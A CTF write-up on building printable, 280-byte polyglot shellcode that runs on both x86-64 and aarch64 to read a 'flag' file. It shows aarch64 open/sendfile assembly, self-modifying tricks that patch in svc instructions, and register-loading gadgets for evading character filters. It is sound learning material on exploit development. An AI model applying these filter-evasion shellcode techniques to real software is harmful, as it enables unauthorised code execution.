# ABC ARM AND AMD

### Goal

The goal of this challenge is to provide a printable shellcode (which can only contain byte from `0x20` to `0x7f`) that can print out the content of file `flag` in both `x86-64` and `arm64v8` and the length of shellcode must not exceed 280 bytes.

### Instruction `orr` vs `jge`

Inspired by this [GitHub repo](https://github.com/ixty/xarch_shellcode/tree/master/stage0), we know that the first step is to use an instruction that acts as `nop` in architecture A and a `jmp` instruction in architecture B. Then, the instruction is ignored in architecture A and will jump to a different section in architecture B. The layout of our shellcode looks like this:

```
    +-------------+
    |   nop/jmp   |
    +-------------+
    |             |
    | shellcode A |
    |             |
    +-------------+
    |             |
    | shellcode B |
    |             |
    +-------------+
```

As stated in the above GitHub repo, `\x7d\xXX\x20\x32` is a nice gadget as this instruction is `orr w29, w11, #0x3fff` in `aarch64`, which acted as `nop` without any side effect, and `\x7d\xXX` is `jge 0xXX` in `x86-64`.

Thus, the first 4 bytes of our shellcode should be this gadget and create our `aarch64` shellcode in `shellcode A` and `x86-64` shellcode in `shellcode B`.

Note that in our case, `aarch64` shellcode has more than 0x80 bytes. We would have to split our `aarch64` shellcode and jump twice so that in `x86-64` we can jump to the correct location. A revised version of the layout of our shellcode:

```
    +---------------+
    |    nop/jmp    |
    +---------------+
    | shellcode arm |
    |   (part 1)    |
    +---------------+
    |    nop/jmp    |
    +---------------+
    | shellcode arm |
    |   (part 2)    |
    +---------------+
    | shellcode x64 |
    |               |
    +---------------+
```

### Deal with familiar architecture first! (`x86-64`)

This part is done by @how2hack.

### Learning `aarch64` shellcode

We never write `aarch64` shellcode before, so the first step is to create a simple straightforward "orw" (stands for Open, Read, Write) shellcode. We used `pwntools` library and print out the assembly of `shellcraft.cat('flag')`.

```python
from pwn import *
context.arch = 'aarch64'
print(shellcraft.cat('flag'))
```

Then we get:

```
    /* push b'flag\x00\x00\x00\x00' */
    sub sp, sp, #16
    /* Set x0 = 1734437990 = 0x67616c66 */
    mov  x0, #27750
    movk x0, #26465, lsl #16
    stur x0, [sp, #16 * 0]
    /* call open('sp', 0, 'O_RDONLY') */
    mov  x0, sp
    mov  x1, xzr
    mov  x2, xzr
    mov  x8, #(SYS_open)
    svc 0
    /* call sendfile(1, 'x0', 0, 2147483647) */
    mov  x1, x0
    mov  x0, #1
    mov  x2, xzr
    /* Set x3 = 2147483647 = 0x7fffffff */
    mov  x3, #65535
    movk x3, #32767, lsl #16
    mov  x8, #(SYS_sendfile)
    svc 0
```

Now we need to transform the above assembly into a shellcode that uses alphanumeric bytes.

##### System call

The instruction `svc` in aarch64 stands for "supervisor call". It works like `syscall` in x86-64. However, if we look up section C3.2.3 of [aarch64 machine code table](https://github.com/CAS-Atlantic/AArch64-Encoding/blob/master/binary%20encodding.pdf), we know that the two most significant bytes is definitely not alphanumeric. Therefore, we must come up with a workaround. Note that our goal for now is to generate a `svc #257` instruction, whose machine code is `b'! \x00\xd4'`. We only have two invalid bytes (`b'\x00\xd4`).

The workaround is that we send `b'! AA'` as placeholder and dynamically change `b'AA'` into `b'\x00\xd4`. To achieve this, we observe that the registers `x0` and `x1` always point to our shellcode. Therefore, we can use `strb w??, [x1, x??]` or `strh w??, [x1, x??]` to dynamically modify our shellcode.

Note that due to the mechanism of instruction cache and data cache, we have to put a branch instruction (not taken) after we finish modifying the shellcode. Otherwise, the instruction cache will not be flushed and the CPU still sees the old placeholders. The branch instruction we use is `cbnz w26, 0x40404`.

##### Loading an arbitrary integer into a register

Let's say the `svc #257` instruction is at the 64th~67th byte of our shellcode, and we want to use `strh w9, [x1, x25]` to replace the 67th byte. That is, `w9` should be `0xd4` and `w25` should be `0x43`. To achieve this, we find [this paper](https://arxiv.org/pdf/1608.03415.pdf), whose section 4.1.2 gives us a great hint. We come up with the following shellcode:

```
/* w26 is always 0 by our observation */
adds w17, w26, #2460
subs w9, w17, #2248 /* w9 = 0xd4 */
adds w17, w26, #2131
subs w25, w11, #2064 /* w25 = 0x43 */
strb w9, [x1, x25]

cbnz w26, 0x40404 /* branch instruction for i-cache flushing */
cbnz w26, 0x40404 /* act as nop */
cbnz w26, 0x40404 /* act as nop */
cbnz w26, 0x40404 /* act as nop */
cbnz w26, 0x40404 /* act as nop */
cbnz w26, 0x40404 /* act as nop */
cbnz w26, 0x40404 /* act as nop */
cbnz w26, 0x40404 /* act as nop */
cbnz w26, 0x40404 /* act as nop */
cbnz w26, 0x40404 /* act as nop */
cbnz w26, 0x40404 /* act as nop */

/* svc #257 */ /* below is the 64th~67th byte */
.inst 0x41413021  /* the two 0x41 is the placeholder */
```

As a check, the assembled machine code is `b'Qs&1)"#qQO!1yA q)h98:  5:  5:  5:  5:  5:  5:  5:  5:  5:  5:  5!0AA'`, which is alphanumeric. The above shellcode can change the 67th byte from `b'A'` to `b'\xd4'`. Read the field specification of `adds` and `subs` machine code. It should be straightforward to construct a alphanumeric `adds` and `subs` pair that loads arbitrary byte into a register.

To sum up, we have a powerful technique that can dynamically modify our shellcode. This means we can execute almost any shellcode we want!

### Optimization

Everything looks so nice ... except that we have a 280 byte limit. Though it seems we can execute arbitrary shellcode, dynamically modify a single byte costs 5 instructions in the previous demonstration. That's why we still need a lot of manual optimization to make our shellcode more compact.

##### Optimization: `openat(-100, "flag", 0, 0)`

To open the file "flag", we have to set `x0` to -100, and `x1` points at the string "flag".

The `x1` part seems to be easier. We just uses `adds x1, x1, 0x??` to make `x1` points at the "flag" string in x86-64 shellcode. However, bad news is that `x1` is a pointer on 64-bit architecture, and both 64-bit `adds` or `subs` are not alphanumeric. We have no choice but use dynamic modification of our shellcode.

The `x0` part has the same problem. We cannot use any 32-bit instruction to make `x0` a -100 in 64-bit. Therefore, we still need dynamic modification of our shellcode.

##### Optimization: use `strh`

In previous demonstration, we use `strb` to modify our shellcode, which change a single bit at a time. In some special situation, we can use `strh` to modify 2 bytes at a time. It can make our modification much more efficient.

The reason is that `adds` and `subs` has a 12-bit immediate, and the immediate's position in the instruction is special. If the immediate is between `[0x0, 0x7ff]`, then we may have a chance to use `strh`. Please refer to the final payload for demonstration.

##### Optimization: reuse `adds`

This is probably the most important optimization in our solution. We analyze every byte which we need to load into registers, and we find out that we can use only few `adds` to cover all the byte we need to modify. For example, we need `0xb1`, `0xba`, `0xbb`, and `0xf1`. We can reuse `adds ` as follows:

```
adds w18, w26, #2508
subs w10, w18, #2331 /* w10 = 0xb1 */
subs w11, w18, #2322 /* w11 = 0xba */
subs w12, w18, #2321 /* w12 = 0xbb */
subs w13, w18, #2267 /* w13 = 0xf1 */
```

In this way, we significantly reduce the number of instructions in our payload.

### The final payload

https://gist.github.com/ktpss95112/319735f78335cf4088239a1b9883811f

flag: `CTF{abc_easy_as_svc}`

### Postscript

After the contest, we read the official writeup. Their approach is to call `execve("/bin/cat", {"/bin/cat", "flag", 0})`, which requires only one system call. This inspire us that we can construct a more compact payload - use no system call! We observe that `x17` contains the libc address of `read()` when our shellcode is executed. That is, we can use `x17` to obtain the address of `system()`, and then simply `system("/bin/cat flag")`. No system call, and only one parameter to prepare.

The PoC is not finished yet. It is placed in `asm-draft2.txt`.

### References

* x86-64 `jge` machine code: https://www.felixcloutier.com/x86/jcc
* Use `gdb` to debug aarch64 binary on x86-64: https://dev.to/offlinemark/how-to-set-up-an-arm64-playground-on-ubuntu-18-04-27i6
* Cross architecture shellcode: https://github.com/ixty/xarch_shellcode
* A useful slides introducing common aarch64 instruction's machine code: https://www.cs.princeton.edu/courses/archive/spr19/cos217/lectures/16_MachineLang.pdf
* A general guide of generating alphanumeric shellcode in aarch64: https://arxiv.org/pdf/1608.03415.pdf
* aarch64 machine code table: https://github.com/CAS-Atlantic/AArch64-Encoding/blob/master/binary%20encodding.pdf
